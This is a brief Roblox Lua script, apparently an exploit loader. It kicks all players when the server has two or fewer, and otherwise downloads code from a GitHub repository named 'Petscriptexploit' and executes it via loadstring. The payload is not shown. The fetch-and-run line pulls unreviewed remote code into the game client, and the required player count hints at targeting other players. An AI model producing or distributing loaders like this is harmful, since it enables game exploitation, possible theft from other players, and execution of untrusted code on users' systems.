local players = game:GetService("Players")

while true do
    wait(1)
    if #players:GetPlayers() <= 2 then
        for _, player in pairs(players:GetPlayers()) do
            player:Kick("Please use this script in a public server or a server with more than 2 people.")
        end
    else
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Petscriptexploit/UniversalSH/raw/refs/heads/main/a"))()
        break
    end
end
